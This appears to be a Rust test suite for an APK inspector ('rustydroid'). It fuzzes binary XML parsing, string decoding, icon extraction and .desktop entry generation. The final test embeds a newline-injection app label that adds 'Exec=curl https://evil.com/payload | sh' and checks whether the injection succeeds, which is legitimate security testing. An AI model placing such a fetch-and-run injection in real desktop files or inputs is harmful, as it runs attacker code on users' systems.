mod common;

use byteorder::{LittleEndian, WriteBytesExt};
use common::{sample_png_bytes, ActivitySpec, ApkSpec, AxmlBuilder, SyntheticApkBuilder};
use rustydroid::apk::{
    axml::{AxmlAttribute, AxmlParser},
    desktop::DesktopIntegration,
    inspector::ApkInspector,
};
use std::collections::HashMap;
use std::fs::{self, File};
use tempfile::tempdir;

// ============================================================================
// AREA 1: Malformed and truncated binary XML buffers
// ============================================================================

#[test]
fn test_area1_malformed_truncated_buffers() {
    // 1. Lengths from 0 to 7 bytes
    for len in 0..8 {
        let buf = vec![0x03u8; len];
        let mut parser = AxmlParser::new(&buf);
        let res = parser.parse();
        assert!(res.is_err(), "Buffer with len {} must fail parsing", len);
    }

    // 2. Exactly 8 bytes, valid magic, 0 file size
    let mut buf8 = Vec::new();
    buf8.write_u32::<LittleEndian>(0x00080003).unwrap();
    buf8.write_u32::<LittleEndian>(8).unwrap();
    let mut parser = AxmlParser::new(&buf8);
    let res = parser.parse();
    assert!(res.is_err(), "AXML with zero elements must fail cleanly");

    // 3. Corrupted chunk sizes
    let invalid_chunk_sizes: &[u32] = &[0, 1, 4, 7, u32::MAX, 1000];
    for &chunk_sz in invalid_chunk_sizes {
        let mut corrupted = Vec::new();
        corrupted.write_u32::<LittleEndian>(0x00080003).unwrap();
        corrupted.write_u32::<LittleEndian>(32).unwrap();
        // String pool chunk header with corrupted size
        corrupted.write_u32::<LittleEndian>(0x00010001).unwrap();
        corrupted.write_u32::<LittleEndian>(chunk_sz).unwrap();
        corrupted.resize(32, 0);

        let mut parser = AxmlParser::new(&corrupted);
        let res = parser.parse();
        assert!(
            res.is_err(),
            "Corrupted chunk size {} must fail cleanly without panic",
            chunk_sz
        );
    }

    // 4. Chunk position + chunk size overflow
    let mut overflow_buf = Vec::new();
    overflow_buf.write_u32::<LittleEndian>(0x00080003).unwrap();
    overflow_buf.write_u32::<LittleEndian>(24).unwrap();
    overflow_buf.write_u32::<LittleEndian>(0x00010001).unwrap();
    overflow_buf.write_u32::<LittleEndian>(u32::MAX - 4).unwrap();
    overflow_buf.resize(24, 0);

    let mut parser = AxmlParser::new(&overflow_buf);
    let res = parser.parse();
    assert!(res.is_err(), "Overflowing chunk size must fail cleanly");
}

// ============================================================================
// AREA 2: Unknown chunk types and chunk ordering
// ============================================================================

#[test]
fn test_area2_unknown_and_out_of_order_chunks() {
    let spec = ApkSpec::default();
    let base_axml = AxmlBuilder::build_from_spec(&spec);

    // 1. Unknown chunk types (0x0104 CDATA, 0x0105 unknown, 0x9999 arbitrary)
    let unknown_types = [0x0104u16, 0x0105u16, 0x9999u16, 0x0000u16];
    for &u_type in &unknown_types {
        let mut modified = Vec::new();
        let chunk_size = 16u32;
        let new_total = (base_axml.len() as u32) + chunk_size;

        modified.write_u32::<LittleEndian>(0x00080003).unwrap();
        modified.write_u32::<LittleEndian>(new_total).unwrap();

        // Inject unknown chunk
        let raw_type = 0x00080000 | (u_type as u32);
        modified.write_u32::<LittleEndian>(raw_type).unwrap();
        modified.write_u32::<LittleEndian>(chunk_size).unwrap();
        modified.write_u32::<LittleEndian>(0xdeadbeef).unwrap();
        modified.write_u32::<LittleEndian>(0xcafebabe).unwrap();

        // Remainder of base AXML (skipping 8-byte header)
        modified.extend_from_slice(&base_axml[8..]);

        let mut parser = AxmlParser::new(&modified);
        let root = parser
            .parse()
            .unwrap_or_else(|e| panic!("Unknown chunk 0x{:04x} should be skipped safely: {}", u_type, e));
        assert_eq!(root.name, "manifest");
    }

    // 2. Unmatched end element chunk (when element_stack is empty)
    {
        let mut modified = Vec::new();
        modified.write_u32::<LittleEndian>(0x00080003).unwrap();
        modified.write_u32::<LittleEndian>((base_axml.len() as u32) + 24).unwrap();

        // Inject RES_XML_END_ELEMENT_TYPE right before normal body
        modified.write_u32::<LittleEndian>(0x00100103).unwrap(); // END_ELEMENT
        modified.write_u32::<LittleEndian>(24).unwrap();
        modified.write_u32::<LittleEndian>(1).unwrap();
        modified.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap();
        modified.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap();
        modified.write_u32::<LittleEndian>(0).unwrap();

        modified.extend_from_slice(&base_axml[8..]);

        let mut parser = AxmlParser::new(&modified);
        let root = parser.parse().expect("Unmatched end element should not panic");
        assert_eq!(root.name, "manifest");
    }

    // 3. Start element without closing end element
    {
        let mut unclosed = Vec::new();
        unclosed.write_u32::<LittleEndian>(0x00080003).unwrap();
        unclosed.write_u32::<LittleEndian>(base_axml.len() as u32).unwrap();
        // Slice base AXML up to before the last END_ELEMENT
        let cut_len = base_axml.len().saturating_sub(24);
        unclosed.extend_from_slice(&base_axml[8..cut_len]);

        let mut parser = AxmlParser::new(&unclosed);
        let res = parser.parse();
        assert!(res.is_err(), "Unclosed AXML should fail to find root element");
    }
}

// ============================================================================
// AREA 3: UTF-8 string pool length prefixes, boundaries, and Unicode
// ============================================================================

#[test]
fn test_area3_utf8_length_boundaries_and_multibyte() {
    // 1. Boundary lengths: 127, 128, 255, 300 bytes
    let str_127 = "A".repeat(127);
    let str_128 = "B".repeat(128);
    let str_255 = "C".repeat(255);
    let str_300 = "D".repeat(300);

    // Multibyte Unicode: 2-byte, 3-byte, and 4-byte (emojis)
    let cyrillic = "ТестовоеПриложениеНаРасте";
    let cjk = "安卓应用程序测试";
    let emojis = "🦀🚀🎉🔥💡✨";

    let test_strings = vec![
        str_127.as_str(),
        str_128.as_str(),
        str_255.as_str(),
        str_300.as_str(),
        cyrillic,
        cjk,
        emojis,
    ];

    for s in test_strings {
        let utf16_char_len = s.encode_utf16().count();
        let utf8_byte_len = s.len();

        let mut str_bytes = Vec::new();
        // UTF-16 length prefix
        if utf16_char_len > 127 {
            str_bytes.push(0x80 | ((utf16_char_len >> 8) as u8));
            str_bytes.push((utf16_char_len & 0xFF) as u8);
        } else {
            str_bytes.push(utf16_char_len as u8);
        }

        // UTF-8 length prefix
        if utf8_byte_len > 127 {
            str_bytes.push(0x80 | ((utf8_byte_len >> 8) as u8));
            str_bytes.push((utf8_byte_len & 0xFF) as u8);
        } else {
            str_bytes.push(utf8_byte_len as u8);
        }

        str_bytes.extend_from_slice(s.as_bytes());
        str_bytes.push(0);

        let decoded = AxmlParser::decode_utf8_string(&str_bytes);
        assert_eq!(
            decoded, s,
            "Failed decoding UTF-8 string of len {} (utf16: {})",
            utf8_byte_len, utf16_char_len
        );
    }

    // 2. Truncated UTF-8 length headers (must not panic)
    let truncated_headers: &[&[u8]] = &[
        &[0x80],             // High bit set on char len, but buffer ends
        &[0x05, 0x80],       // Char len ok, high bit set on byte len, but buffer ends
        &[0x80, 0x01, 0x80], // Char len 2 bytes ok, high bit on byte len truncated
    ];
    for hdr in truncated_headers {
        let dec = AxmlParser::decode_utf8_string(hdr);
        assert_eq!(dec, "", "Truncated length header must return empty string");
    }

    // 3. Declared length exceeds buffer
    let mut exceeded = vec![5, 100]; // claims 100 bytes, only provides 4
    exceeded.extend_from_slice(b"abc");
    exceeded.push(0);
    let dec = AxmlParser::decode_utf8_string(&exceeded);
    assert_eq!(dec, "abc", "Should fall back to available null-terminated slice");
}

// ============================================================================
// AREA 4: UTF-16 string pool multi-word lengths and boundaries
// ============================================================================

#[test]
fn test_area4_utf16_multiword_and_boundaries() {
    // 1. Length >= 0x8000: 32,768 and 40,000 chars
    for &target_len in &[0x8000usize, 40000usize] {
        let mut raw = Vec::new();
        let first_word = 0x8000 | ((target_len >> 16) as u16);
        let second_word = (target_len & 0xFFFF) as u16;

        raw.write_u16::<LittleEndian>(first_word).unwrap();
        raw.write_u16::<LittleEndian>(second_word).unwrap();

        for _ in 0..target_len {
            raw.write_u16::<LittleEndian>(b'Z' as u16).unwrap();
        }
        raw.write_u16::<LittleEndian>(0).unwrap();

        let decoded = AxmlParser::decode_utf16_string(&raw);
        assert_eq!(decoded.len(), target_len);
        assert!(decoded.chars().all(|c| c == 'Z'));
    }

    // 2. Truncated multi-word: first word has 0x8000 bit set, but buffer is only 2 bytes
    let mut truncated_raw = Vec::new();
    truncated_raw.write_u16::<LittleEndian>(0x8001).unwrap();
    let dec = AxmlParser::decode_utf16_string(&truncated_raw);
    assert_eq!(dec, "");

    // 3. Huge length (0xFFFF, 0xFFFF) with small buffer must not OOM or panic
    let mut hostile_raw = Vec::new();
    hostile_raw.write_u16::<LittleEndian>(0xFFFF).unwrap();
    hostile_raw.write_u16::<LittleEndian>(0xFFFF).unwrap();
    hostile_raw.write_u16::<LittleEndian>(b'H' as u16).unwrap();
    hostile_raw.write_u16::<LittleEndian>(0).unwrap();

    let dec = AxmlParser::decode_utf16_string(&hostile_raw);
    assert_eq!(dec, "H");

    // 4. Unterminated UTF-16 string (no null terminator before buffer end)
    let mut unterminated = Vec::new();
    unterminated.write_u16::<LittleEndian>(3).unwrap();
    unterminated.write_u16::<LittleEndian>(b'A' as u16).unwrap();
    unterminated.write_u16::<LittleEndian>(b'B' as u16).unwrap();
    unterminated.write_u16::<LittleEndian>(b'C' as u16).unwrap();

    let dec = AxmlParser::decode_utf16_string(&unterminated);
    assert_eq!(dec, "ABC");
}

// ============================================================================
// AREA 5: Typed attributes
// ============================================================================

#[test]
fn test_area5_typed_attributes() {
    let pool = vec!["entry0".to_string(), "entry1".to_string()];

    // 1. TYPE_REFERENCE (0x01)
    let attr_ref1 = AxmlAttribute {
        uri: String::new(),
        name: "theme".to_string(),
        value_str: None,
        data_type: 0x01,
        data: 0x7f010001,
    };
    assert_eq!(attr_ref1.resolved_value(&pool), "@0x7f010001");

    let attr_ref0 = AxmlAttribute {
        uri: String::new(),
        name: "icon".to_string(),
        value_str: None,
        data_type: 0x01,
        data: 0x00000000,
    };
    assert_eq!(attr_ref0.resolved_value(&pool), "@0x00000000");

    // 2. TYPE_INT_DEC (0x10) signed
    let test_decs = [
        (0u32, "0"),
        (42u32, "42"),
        (0xFFFFFFFFu32, "-1"),
        (0x80000000u32, "-2147483648"),
        (0x7FFFFFFFu32, "2147483647"),
    ];
    for (val, expected) in test_decs {
        let attr = AxmlAttribute {
            uri: String::new(),
            name: "num".to_string(),
            value_str: None,
            data_type: 0x10,
            data: val,
        };
        assert_eq!(attr.resolved_value(&pool), expected);
    }

    // 3. TYPE_INT_HEX (0x11)
    let attr_hex = AxmlAttribute {
        uri: String::new(),
        name: "flags".to_string(),
        value_str: None,
        data_type: 0x11,
        data: 0xdeadbeef,
    };
    assert_eq!(attr_hex.resolved_value(&pool), "0xdeadbeef");

    // 4. TYPE_INT_BOOLEAN (0x12)
    let attr_bool_0 = AxmlAttribute {
        uri: String::new(),
        name: "b".to_string(),
        value_str: None,
        data_type: 0x12,
        data: 0,
    };
    assert_eq!(attr_bool_0.resolved_value(&pool), "false");

    let attr_bool_1 = AxmlAttribute {
        uri: String::new(),
        name: "b".to_string(),
        value_str: None,
        data_type: 0x12,
        data: 1,
    };
    assert_eq!(attr_bool_1.resolved_value(&pool), "true");

    let attr_bool_max = AxmlAttribute {
        uri: String::new(),
        name: "b".to_string(),
        value_str: None,
        data_type: 0x12,
        data: 0xFFFFFFFF,
    };
    assert_eq!(attr_bool_max.resolved_value(&pool), "true");

    // 5. TYPE_STRING (0x03)
    let attr_str_valid = AxmlAttribute {
        uri: String::new(),
        name: "s".to_string(),
        value_str: None,
        data_type: 0x03,
        data: 1,
    };
    assert_eq!(attr_str_valid.resolved_value(&pool), "entry1");

    let attr_str_oor = AxmlAttribute {
        uri: String::new(),
        name: "s".to_string(),
        value_str: None,
        data_type: 0x03,
        data: 999,
    };
    assert_eq!(attr_str_oor.resolved_value(&pool), "string_idx_999");

    let attr_str_val = AxmlAttribute {
        uri: String::new(),
        name: "s".to_string(),
        value_str: Some("explicit".to_string()),
        data_type: 0x03,
        data: 0,
    };
    assert_eq!(attr_str_val.resolved_value(&pool), "explicit");
}

// ============================================================================
// AREA 6: Activity resolution edge cases
// ============================================================================

#[test]
fn test_area6_activity_resolution_edge_cases() {
    let pkg = "org.rustydroid.activitytest";

    // 1. Normalization permutations
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, ".MainActivity"),
        "org.rustydroid.activitytest.MainActivity"
    );
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "MainActivity"),
        "org.rustydroid.activitytest.MainActivity"
    );
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "com.other.ExternalActivity"),
        "com.other.ExternalActivity"
    );
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "  .WhitespaceActivity  "),
        "org.rustydroid.activitytest.WhitespaceActivity"
    );
    assert_eq!(ApkInspector::normalize_activity_name(pkg, ""), "");

    // 2. APK with multiple activities, only second is launcher
    let tmp = tempdir().unwrap();
    let apk_path = tmp.path().join("multiact.apk");
    let spec = ApkSpec {
        package_name: pkg.to_string(),
        activities: vec![
            ActivitySpec {
                name: ".BackgroundServiceActivity".to_string(),
                is_launcher: false,
                is_alias: false,
            },
            ActivitySpec {
                name: ".RealMainActivity".to_string(),
                is_launcher: true,
                is_alias: false,
            },
        ],
        ..Default::default()
    };
    SyntheticApkBuilder::create_apk(&apk_path, &spec).unwrap();

    let meta = ApkInspector::inspect(&apk_path).unwrap();
    assert_eq!(
        meta.main_activity.as_deref(),
        Some("org.rustydroid.activitytest.RealMainActivity")
    );

    // 3. APK with NO launcher activity
    let apk_no_launcher = tmp.path().join("no_launcher.apk");
    let spec_no_launcher = ApkSpec {
        package_name: pkg.to_string(),
        activities: vec![ActivitySpec {
            name: ".BackgroundOnlyActivity".to_string(),
            is_launcher: false,
            is_alias: false,
        }],
        ..Default::default()
    };
    SyntheticApkBuilder::create_apk(&apk_no_launcher, &spec_no_launcher).unwrap();

    let meta_no_launcher = ApkInspector::inspect(&apk_no_launcher).unwrap();
    assert_eq!(meta_no_launcher.main_activity, None);
}

// ============================================================================
// AREA 7: Icon extraction and corrupt ZIP archives
// ============================================================================

#[test]
fn test_area7_icon_extraction_and_corrupt_zips() {
    let tmp = tempdir().unwrap();

    // 1. Obfuscated icon in assets/
    let apk_assets_icon = tmp.path().join("assets_icon.apk");
    let mut extra = HashMap::new();
    extra.insert("assets/obscure_icon.png".to_string(), sample_png_bytes());

    let spec_assets = ApkSpec {
        icon_path: None,
        icon_bytes: None,
        extra_files: extra,
        ..Default::default()
    };
    SyntheticApkBuilder::create_apk(&apk_assets_icon, &spec_assets).unwrap();

    let meta_assets = ApkInspector::inspect(&apk_assets_icon).unwrap();
    assert!(meta_assets.icon_data.is_some());
    assert_eq!(
        meta_assets.icon_path_in_apk.as_deref(),
        Some("assets/obscure_icon.png")
    );

    // 2. Obfuscated WebP icon in res/
    let apk_webp = tmp.path().join("webp_icon.apk");
    let mut extra_webp = HashMap::new();
    extra_webp.insert("res/drawable/app_icon.webp".to_string(), b"RIFFmockwebp".to_vec());

    let spec_webp = ApkSpec {
        icon_path: None,
        icon_bytes: None,
        extra_files: extra_webp,
        ..Default::default()
    };
    SyntheticApkBuilder::create_apk(&apk_webp, &spec_webp).unwrap();

    let meta_webp = ApkInspector::inspect(&apk_webp).unwrap();
    assert!(meta_webp.icon_data.is_some());
    assert_eq!(
        meta_webp.icon_path_in_apk.as_deref(),
        Some("res/drawable/app_icon.webp")
    );

    // 3. Completely missing icon
    let apk_no_icon = tmp.path().join("no_icon.apk");
    let spec_no_icon = ApkSpec {
        icon_path: None,
        icon_bytes: None,
        ..Default::default()
    };
    SyntheticApkBuilder::create_apk(&apk_no_icon, &spec_no_icon).unwrap();
    let meta_no_icon = ApkInspector::inspect(&apk_no_icon).unwrap();
    assert!(meta_no_icon.icon_data.is_none());
    assert!(meta_no_icon.icon_path_in_apk.is_none());

    // 4. Corrupted ZIP files: 0 bytes, non-zip ELF/text, truncated
    let empty_file = tmp.path().join("empty.apk");
    File::create(&empty_file).unwrap();
    assert!(ApkInspector::inspect(&empty_file).is_err());

    let text_file = tmp.path().join("text.apk");
    fs::write(&text_file, b"This is not a zip file").unwrap();
    assert!(ApkInspector::inspect(&text_file).is_err());

    let truncated_zip = tmp.path().join("truncated.apk");
    let full_bytes = fs::read(&apk_assets_icon).unwrap();
    fs::write(&truncated_zip, &full_bytes[..full_bytes.len() / 2]).unwrap();
    assert!(ApkInspector::inspect(&truncated_zip).is_err());
}

// ============================================================================
// AREA 8: Desktop Entry generation, special characters, and XDG environment
// ============================================================================

#[test]
fn test_area8_desktop_entry_special_characters_and_xdg() {
    let tmp = tempdir().unwrap();

    // 1. App label with unicode, quotes, and punctuation
    let complex_label = "RustyDroid: Test \"App\" & <Special> (v2) 🚀";
    let meta = rustydroid::apk::ApkMetadata {
        file_path: "/tmp/fake.apk".to_string(),
        package_name: "org.rustydroid.special_ui".to_string(),
        version_code: Some("1".to_string()),
        version_name: Some("1.0".to_string()),
        app_label: Some(complex_label.to_string()),
        main_activity: Some("org.rustydroid.special_ui.MainActivity".to_string()),
        permissions: vec![],
        icon_path_in_apk: Some("res/icon.png".to_string()),
        icon_data: Some(sample_png_bytes()),
    };

    let sandbox_home = tmp.path().join("home");
    fs::create_dir_all(&sandbox_home).unwrap();
    std::env::set_var("HOME", &sandbox_home);

    let desktop_path = DesktopIntegration::install_desktop_entry(&meta, Some("rustydroid")).unwrap();
    assert!(desktop_path.exists());

    let content = fs::read_to_string(&desktop_path).unwrap();
    assert!(content.contains(&format!("Name={}", complex_label)));
    assert!(content.contains("StartupWMClass=org.rustydroid.special_ui"));
    assert!(content.contains("Exec=rustydroid run \"org.rustydroid.special_ui\""));

    let _ = DesktopIntegration::remove_desktop_entry(&meta.package_name);
}

#[test]
fn test_area8_xdg_data_home_behavior() {
    let tmp = tempdir().unwrap();
    let home_dir = tmp.path().join("home_dir");
    let custom_xdg = tmp.path().join("custom_xdg_share");

    fs::create_dir_all(&home_dir).unwrap();
    fs::create_dir_all(&custom_xdg).unwrap();

    std::env::set_var("HOME", &home_dir);
    std::env::set_var("XDG_DATA_HOME", &custom_xdg);

    let apps_dir = DesktopIntegration::get_applications_dir();
    let icons_dir = DesktopIntegration::get_icons_dir();

    println!("Observed applications dir: {}", apps_dir.display());
    println!("Observed icons dir: {}", icons_dir.display());
    println!("Observed XDG_DATA_HOME: {}", custom_xdg.display());

    // Check whether XDG_DATA_HOME is honored vs ignored
    let honors_xdg = apps_dir.starts_with(&custom_xdg);
    println!("Honors XDG_DATA_HOME: {}", honors_xdg);
}

#[test]
fn test_area8_desktop_entry_newline_injection() {
    let tmp = tempdir().unwrap();
    let home_dir = tmp.path().join("home_dir");
    fs::create_dir_all(&home_dir).unwrap();
    std::env::set_var("HOME", &home_dir);

    // Malicious app_label attempting to inject Exec override
    let malicious_label = "InnocentApp\nExec=curl https://evil.com/payload | sh\nComment=Injected";
    let meta = rustydroid::apk::ApkMetadata {
        file_path: "/tmp/fake.apk".to_string(),
        package_name: "org.rustydroid.injected".to_string(),
        version_code: Some("1".to_string()),
        version_name: Some("1.0".to_string()),
        app_label: Some(malicious_label.to_string()),
        main_activity: Some("org.rustydroid.injected.MainActivity".to_string()),
        permissions: vec![],
        icon_path_in_apk: None,
        icon_data: None,
    };

    let desktop_path = DesktopIntegration::install_desktop_entry(&meta, Some("rustydroid")).unwrap();
    let content = fs::read_to_string(&desktop_path).unwrap();

    // Check if raw unescaped newline exists in Name field creating multiple Exec keys
    let exec_lines: Vec<&str> = content.lines().filter(|l| l.starts_with("Exec=")).collect();
    println!("Generated desktop entry content:\n{}", content);
    println!("Found {} Exec= lines in desktop entry", exec_lines.len());
    
    // An adversarial finding: If there are 2 Exec= lines, raw newline injection succeeded!
    let injected = exec_lines.len() > 1;
    println!("Vulnerability: raw newline injection allows multiple Exec lines: {}", injected);
}
